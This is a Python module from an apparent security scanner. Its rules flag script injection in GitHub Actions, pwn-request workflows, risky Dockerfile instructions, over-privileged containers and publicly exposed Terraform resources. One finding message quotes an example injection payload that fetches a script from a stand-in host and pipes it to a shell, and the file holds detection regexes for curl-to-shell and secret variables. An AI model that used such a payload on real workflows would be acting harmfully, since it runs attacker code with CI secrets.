"""Deployment files developers commit next to their code: GitHub Actions, Dockerfiles, docker-compose /
Kubernetes YAML and Terraform. Line-based, because these formats are small and their risky patterns are local."""

from __future__ import annotations

import re

from ..finding import Finding, Severity
from ..parsing import SourceFile
from .base import Rule
from .secrets import match_secret


def line_finding(rule: Rule, src: SourceFile, line: int, severity: Severity, message: str, fix: str, column: int = 1) -> Finding:
    return Finding(rule_id=rule.id, cwe=rule.cwe, severity=severity, title=rule.title, message=message, fix=fix,
                   file=src.rel, line=line, column=column, snippet=src.line(line))


def _is_workflow(src: SourceFile) -> bool:
    rel = src.rel.replace("\\", "/")
    return "/.github/workflows/" in f"/{rel}" and rel.endswith((".yml", ".yaml"))


def _is_dockerfile(src: SourceFile) -> bool:
    name = src.path.name.lower()
    return name.startswith(("dockerfile", "containerfile")) or name.endswith(".dockerfile")


# ── GitHub Actions ──────────────────────────────────────────────
UNTRUSTED_CONTEXT = re.compile(
    r"\$\{\{\s*(github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|pages\.[^}]*\.page_name"
    r"|commits\.[^}]*\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name))"
    r"|workflow_run\.(?:head_branch|head_commit\.message|display_title))|github\.head_ref)\s*\}\}"
)
RUN_KEY = re.compile(r"^(\s*)(?:-\s+)?(run|script)\s*:\s*(.*)$")


class ActionsInjection(Rule):
    id = "ARX-GHA-INJECT"
    cwe = "CWE-78"
    title = "GitHub Actions script injection"
    description = "An issue title, PR branch name or commit message is pasted into a shell step, so anyone can run commands in your CI."
    families = ("*",)
    FIX = ("Pass the value through an environment variable (env: TITLE: ${{ github.event.issue.title }}) and use \"$TITLE\" in the "
           "script — never ${{ … }} directly inside run:.")

    def wants(self, src):
        return _is_workflow(src)

    def check(self, src, taint):
        out = []
        block_indent = None
        for i, raw in enumerate(src.lines, 1):
            m = RUN_KEY.match(raw)
            if m:
                block_indent = len(m.group(1)) if m.group(3).strip() in {"|", ">", "|-", ">-", "|+", ">+", ""} else None
                inline = m.group(3)
            elif block_indent is not None and raw.strip() and (len(raw) - len(raw.lstrip())) <= block_indent:
                block_indent = None
                inline = ""
            else:
                inline = raw if block_indent is not None else ""
            hit = UNTRUSTED_CONTEXT.search(inline)
            if hit:
                out.append(line_finding(self, src, i, Severity.HIGH,
                                        f"`{hit.group(1)}` is expanded inside a script — a crafted value like "
                                        "`a\"; curl evil.sh | sh; #` runs with the workflow's token and secrets.",
                                        self.FIX, column=raw.find(hit.group(0)) + 1))
        return out


class ActionsPwnRequest(Rule):
    id = "ARX-GHA-PWN"
    cwe = "CWE-829"
    title = "Untrusted pull request code runs with secrets (pwn request)"
    description = "A pull_request_target / workflow_run job checks out the contributor's code and runs it with write access and secrets."
    families = ("*",)
    FIX = "Use `on: pull_request` for building untrusted code, or never check out the PR head in pull_request_target jobs."

    def wants(self, src):
        return _is_workflow(src)

    def check(self, src, taint):
        if not re.search(r"^\s*(?:on:\s*\[?[^\n]*\b(?:pull_request_target|workflow_run)\b|(?:pull_request_target|workflow_run)\s*:)",
                         src.text, re.MULTILINE):
            return []
        out = []
        for i, raw in enumerate(src.lines, 1):
            if re.search(r"^\s*ref\s*:\s*\$\{\{\s*github\.event\.(?:pull_request\.head\.(?:sha|ref)|workflow_run\.head_(?:sha|branch))", raw) \
                    or "refs/pull/${{ github.event.pull_request.number }}/merge" in raw:
                out.append(line_finding(self, src, i, Severity.CRITICAL,
                                        "The contributor's pull request code is checked out in a privileged workflow — any build or "
                                        "test step runs attacker code with repository secrets.", self.FIX))
        return out


# ── Dockerfile ──────────────────────────────────────────────────
class DockerfileRisk(Rule):
    id = "ARX-DOCKER"
    cwe = "CWE-250"
    title = "Risky Dockerfile instruction"
    description = "The container runs as root, bakes secrets into image layers or pipes a download straight into a shell."
    families = ("*",)
    SECRET_ENV = re.compile(r"^\s*(?:ENV|ARG)\s+([A-Z0-9_]*(?:PASSWORD|PASSWD|SECRET|TOKEN|API_KEY|ACCESS_KEY|PRIVATE_KEY)[A-Z0-9_]*)\s*[= ]\s*(\S+)", re.IGNORECASE)
    CURL_SH = re.compile(r"\b(?:curl|wget)\b[^|;&]*\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b")

    def wants(self, src):
        return _is_dockerfile(src)

    def check(self, src, taint):
        out = []
        user = None
        final_start = 1
        runs = False
        for i, raw in enumerate(src.lines, 1):
            line = raw.strip()
            upper = line.upper()
            if upper.startswith("FROM "):
                final_start, user, runs = i, None, False
                if re.search(r":latest\b", line, re.IGNORECASE) or (":" not in line.split()[1] and "@" not in line and line.split()[1].lower() != "scratch"):
                    out.append(line_finding(self, src, i, Severity.LOW, f"Base image `{line.split()[1]}` is not pinned — every build may pull different code.",
                                            "Pin a version tag or digest (python:3.12-slim@sha256:…)."))
            elif upper.startswith("USER "):
                user = line.split(None, 1)[1].strip()
            elif upper.startswith(("CMD", "ENTRYPOINT")):
                runs = True
            m = self.SECRET_ENV.match(line)
            if m and not m.group(2).startswith("$") and m.group(2) not in {'""', "''"} and match_secret(raw) is None:
                out.append(line_finding(self, src, i, Severity.HIGH,
                                        f"`{m.group(1)}` is written into the image — anyone who pulls the image can read it (docker history).",
                                        "Pass secrets at runtime (docker run -e / secrets) or use BuildKit --mount=type=secret during the build."))
            if upper.startswith("RUN") and self.CURL_SH.search(line):
                out.append(line_finding(self, src, i, Severity.MEDIUM, "A downloaded script is piped straight into a shell without a checksum.",
                                        "Download to a file, verify its sha256, then run it."))
            if upper.startswith("ADD ") and re.search(r"\bhttps?://", line):
                out.append(line_finding(self, src, i, Severity.LOW, "ADD fetches a remote file without integrity checks.",
                                        "Use RUN curl with a checksum check, or COPY a vendored file."))
        if runs and (user is None or user.split(":")[0] in {"root", "0"}):
            out.append(line_finding(self, src, final_start, Severity.LOW,
                                    "The final image runs as root — a compromised app gets root inside the container.",
                                    "Create a user and switch to it: RUN useradd -r app && USER app"))
        return out


# ── docker-compose / Kubernetes ────────────────────────────────
class ContainerPrivileged(Rule):
    id = "ARX-CONTAINER"
    cwe = "CWE-250"
    title = "Over-privileged container"
    description = "A container runs privileged, shares the host network / PID namespace or mounts the Docker socket — a breakout gives root on the host."
    families = ("*",)
    CHECKS = [
        (re.compile(r"^\s*privileged\s*:\s*true\b", re.IGNORECASE), Severity.HIGH, "`privileged: true` gives the container full access to the host."),
        (re.compile(r"/var/run/docker\.sock"), Severity.HIGH, "The Docker socket is mounted — the container can start root containers on the host."),
        (re.compile(r"^\s*allowPrivilegeEscalation\s*:\s*true\b"), Severity.MEDIUM, "`allowPrivilegeEscalation: true` lets processes gain more privileges."),
        (re.compile(r"^\s*(?:hostNetwork|hostPID|hostIPC)\s*:\s*true\b"), Severity.MEDIUM, "The pod shares a host namespace (network / PID / IPC)."),
        (re.compile(r"^\s*(?:pid|ipc)\s*:\s*[\"']?host\b"), Severity.MEDIUM, "The container shares the host PID / IPC namespace."),
        (re.compile(r"^\s*runAsUser\s*:\s*0\b"), Severity.MEDIUM, "`runAsUser: 0` runs the container as root."),
        (re.compile(r"^\s*-\s*(?:SYS_ADMIN|ALL)\s*$|cap_add\s*:\s*\[\s*(?:SYS_ADMIN|ALL)"), Severity.HIGH, "SYS_ADMIN / ALL capabilities are nearly equal to root on the host."),
    ]
    FIX = "Drop privileged mode and host namespaces, never mount /var/run/docker.sock, run as a non-root user with minimal capabilities."

    def wants(self, src):
        name = src.path.name.lower()
        if not name.endswith((".yml", ".yaml")) or _is_workflow(src):
            return False
        return bool(re.search(r"^\s*(?:services|apiVersion|kind)\s*:", src.text, re.MULTILINE))

    def check(self, src, taint):
        out = []
        for i, raw in enumerate(src.lines, 1):
            if raw.lstrip().startswith("#"):
                continue
            for pattern, severity, message in self.CHECKS:
                if pattern.search(raw):
                    out.append(line_finding(self, src, i, severity, message, self.FIX))
                    break
        return out


# ── Terraform ───────────────────────────────────────────────────
class TerraformRisk(Rule):
    id = "ARX-TF"
    cwe = "CWE-284"
    title = "Publicly exposed cloud resource"
    description = "Terraform opens a bucket, database or admin port to the whole internet."
    families = ("*",)
    FIX = "Restrict access to known CIDRs / security groups, keep buckets private and databases in private subnets."

    def wants(self, src):
        return src.path.suffix.lower() == ".tf"

    def check(self, src, taint):
        out = []
        resource_start, block = 0, []
        for i, raw in enumerate(src.lines, 1):
            line = raw.strip()
            if re.match(r"^(?:resource|module)\s+\"", line):
                resource_start, block = i, []
            block.append(line)
            if re.match(r"^acl\s*=\s*\"public-read(?:-write)?\"", line):
                out.append(line_finding(self, src, i, Severity.HIGH, "The S3 bucket ACL makes every object readable by anyone.", self.FIX))
            elif re.match(r"^publicly_accessible\s*=\s*true", line):
                out.append(line_finding(self, src, i, Severity.HIGH, "The database is reachable from the internet.", self.FIX))
            elif re.match(r"^(?:storage_)?encrypted\s*=\s*false", line):
                out.append(line_finding(self, src, i, Severity.MEDIUM, "Storage encryption is turned off.", "Set encrypted = true (or storage_encrypted = true)."))
            elif "0.0.0.0/0" in line and re.search(r"cidr_blocks|cidr_ipv4|source_ranges", line):
                ports = " ".join(src.lines[max(0, i - 12):i + 6])
                if re.search(r"(?:from_port|to_port|port)\s*=\s*\"?(?:22|3389|3306|5432|6379|27017|9200)\b", ports) or re.search(r"ports\s*=\s*\[[^\]]*\"(?:22|3389)\"", ports):
                    out.append(line_finding(self, src, i, Severity.HIGH, "An admin / database port is open to 0.0.0.0/0 (the whole internet).", self.FIX))
        return out
